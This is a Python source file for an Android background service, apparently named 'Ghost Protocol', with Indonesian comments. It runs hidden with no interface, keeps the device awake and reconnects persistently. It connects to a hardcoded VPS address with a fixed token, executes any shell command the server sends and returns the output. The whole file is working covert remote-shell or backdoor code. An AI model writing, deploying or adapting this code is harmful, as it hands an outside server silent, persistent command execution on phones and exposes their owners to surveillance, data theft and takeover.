"""
NOIR SOVEREIGN: ANDROID GHOST PROTOCOL (V30.2)
==============================================
Client Executor khusus Android. 
Berjalan murni sebagai Service di latar belakang (tanpa GUI yang terlihat), 
dikendalikan sepenuhnya oleh VPS melalui WebSocket.

Requirement (Buildozer): 
- android.permissions = INTERNET, RECEIVE_BOOT_COMPLETED, WAKE_LOCK, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
- services = NoirGhostService:service.py
"""
import os
import sys
import json
import asyncio
import threading
from time import sleep

# Import pustaka untuk antarmuka native Android via JNI
try:
    from jnius import autoclass
    from android import api_version
    HAS_ANDROID = True
except ImportError:
    HAS_ANDROID = False

# Konfigurasi Koneksi ke Otak (Brain)
VPS_WS_URL = "ws://8.215.23.17:8765"
AUTH_TOKEN = "NOIR-SOVEREIGN-KEY-999"
DEVICE_ID = "NOIR-ANDROID-NODE-001"

class AndroidExecutor:
    def __init__(self):
        self.running = True
        self.Context = autoclass('android.content.Context') if HAS_ANDROID else None
        self.PythonActivity = autoclass('org.kivy.android.PythonActivity') if HAS_ANDROID else None

    def acquire_wake_lock(self):
        """Mencegah Android mematikan proses ini saat layar mati (Doze Mode)."""
        if not HAS_ANDROID: return
        try:
            PowerManager = autoclass('android.os.PowerManager')
            activity = self.PythonActivity.mActivity
            pm = activity.getSystemService(self.Context.POWER_SERVICE)
            self.wake_lock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Noir::GhostLock")
            self.wake_lock.acquire()
        except Exception as e:
            print(f"[Error] WakeLock failed: {e}")

    async def execute_command(self, cmd: str) -> str:
        """Mengeksekusi perintah shell Android."""
        try:
            proc = await asyncio.create_subprocess_shell(
                cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await proc.communicate()
            return stdout.decode() if stdout else stderr.decode()
        except Exception as e:
            return f"[Error] Android execution failed: {e}"

    async def run_connection(self):
        """Loop utama koneksi WebSocket ke VPS."""
        import websockets  # Diimpor di dalam agar tidak memblokir startup Kivy

        print("=" * 54)
        print(" NOIR SOVEREIGN: ANDROID GHOST PROTOCOL ACTIVE")
        print("=" * 54)

        headers = {"Authorization": f"Bearer {AUTH_TOKEN}"}
        self.acquire_wake_lock()

        while self.running:
            try:
                async with websockets.connect(
                    f"{VPS_WS_URL}?device_id={DEVICE_ID}&type=android",
                    extra_headers=headers
                ) as ws:
                    print("[\033[92mONLINE\033[0m] Connected to VPS. Hiding in background...")

                    while self.running:
                        msg = await ws.recv()
                        try:
                            data = json.loads(msg)
                            if data.get("type") == "tool_call":
                                req_id = data.get("req_id")
                                tool_name = data.get("tool")
                                kwargs = data.get("kwargs", {})

                                result = ""
                                if tool_name == "run_cmd":
                                    result = await self.execute_command(kwargs.get("cmd", ""))
                                else:
                                    result = f"[Error] Tool {tool_name} not implemented for Android yet."

                                await ws.send(json.dumps({
                                    "type": "tool_result",
                                    "req_id": req_id,
                                    "result": result
                                }))
                        except Exception as e:
                            print(f"[Error] Msg parse: {e}")

            except Exception as e:
                print(f"[\033[91mDISCONNECTED\033[0m] Reconnecting in 5s... ({e})")
                await asyncio.sleep(5)

def start_service():
    """Fungsi pembungkus untuk menjalankan coroutine di Android."""
    executor = AndroidExecutor()
    asyncio.run(executor.run_connection())

if __name__ == '__main__':
    start_service()
